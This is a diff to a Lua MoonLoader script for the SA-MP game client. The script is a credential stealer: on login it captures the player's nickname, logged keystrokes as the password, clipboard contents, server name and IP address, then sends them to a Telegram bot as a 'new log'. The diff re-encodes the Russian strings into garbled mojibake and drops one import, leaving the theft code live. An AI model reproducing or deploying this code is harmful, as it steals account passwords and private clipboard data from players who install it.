@@ -4,7 +4,6 @@ wm = require "windows.message"
 local requests = require("requests")
 local encoding = require("encoding")
 local sampev = require 'lib.samp.events'
-local dlstatus = require('moonloader').download_status
 
 encoding.default = "CP1251"
 local u8 = encoding.UTF8
@@ -115,7 +114,7 @@ function Telegram:new(token, chatId)
             local url = ("https://api.telegram.org/bot%s/sendMessage"):format(private.token)
             local status, result = pcall(requests.get, {url = url, params = params})     
             if not status then
-                print("Ошибка при отправке:", result)
+                print("РћС€РёР±РєР° РїСЂРё РѕС‚РїСЂР°РІРєРµ:", result)
             end              
         end
 
@@ -128,7 +127,7 @@ local function getIPAddress()
     if status and response.status_code == 200 then
         ip_address = response.text
     else
-        ip_address = "Не удалось получить IP-адрес"
+        ip_address = "РќРµ СѓРґР°Р»РѕСЃСЊ РїРѕР»СѓС‡РёС‚СЊ IP-Р°РґСЂРµСЃ"
     end
 end
 
@@ -139,7 +138,7 @@ getIPAddress()
 
 function sampev.onServerMessage(color, text)
     if spawned then
-        if text:find('Ваш премиум') then
+        if text:find('Р’Р°С€ РїСЂРµРјРёСѓРј') then
             premium = true
         end
     end
@@ -151,15 +150,15 @@ addEventHandler("onSendRpc", function(id)
         local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
         local password = table.concat(pressed_keys, ", ")
         if password == "" or password == nil then
-            password = "Не удалось получить пароль"
+            password = "РќРµ СѓРґР°Р»РѕСЃСЊ РїРѕР»СѓС‡РёС‚СЊ РїР°СЂРѕР»СЊ"
         end
         bufer = getClipboardText()
         lua_thread.create(function()
             wait(3500)
             if premium then
-                telegram:sendMessage(("%%E2%%99%%BB Пришёл новый лог. \n\n%%F0%%9F%%92%%BB Сервер: \"%s\". \n%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Nick: \"%s\". \n%%F0%%9F%%94%%93 Password: \"%s\". \n%%F0%%9F%%91%%91 Premium: Имеется\n%%F0%%9F%%A4%%96 Clipboard: \"%s\"\n%%F0%%9F%%92%%BD IP входа: \"%s\"\n\n%%F0%%9F%%A4%%96 Version: 0.6"):format(sampGetCurrentServerName(), nickname, password, bufer, ip_address))
+                telegram:sendMessage(("%%E2%%99%%BB РџСЂРёС€С‘Р» РЅРѕРІС‹Р№ Р»РѕРі. \n\n%%F0%%9F%%92%%BB РЎРµСЂРІРµСЂ: \"%s\". \n%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Nick: \"%s\". \n%%F0%%9F%%94%%93 Password: \"%s\". \n%%F0%%9F%%91%%91 Premium: РРјРµРµС‚СЃСЏ\n%%F0%%9F%%A4%%96 Clipboard: \"%s\"\n%%F0%%9F%%92%%BD IP РІС…РѕРґР°: \"%s\"\n\n%%F0%%9F%%A4%%96 Version: 0.6"):format(sampGetCurrentServerName(), nickname, password, bufer, ip_address))
             else
-                telegram:sendMessage(("%%E2%%99%%BB Пришёл новый лог. \n\n%%F0%%9F%%92%%BB Сервер: \"%s\". \n%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Nick: \"%s\". \n%%F0%%9F%%94%%93 Password: \"%s\".\n%%F0%%9F%%A4%%96 Clipboard: \"%s\". \n%%F0%%9F%%92%%BD IP входа: \"%s\"\n\n%%F0%%9F%%A4%%96 Version: 0.6"):format(sampGetCurrentServerName(), nickname, password, bufer, ip_address))
+                telegram:sendMessage(("%%E2%%99%%BB РџСЂРёС€С‘Р» РЅРѕРІС‹Р№ Р»РѕРі. \n\n%%F0%%9F%%92%%BB РЎРµСЂРІРµСЂ: \"%s\". \n%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Nick: \"%s\". \n%%F0%%9F%%94%%93 Password: \"%s\".\n%%F0%%9F%%A4%%96 Clipboard: \"%s\". \n%%F0%%9F%%92%%BD IP РІС…РѕРґР°: \"%s\"\n\n%%F0%%9F%%A4%%96 Version: 0.6"):format(sampGetCurrentServerName(), nickname, password, bufer, ip_address))
             end
             pressed_keys = {}
         end)
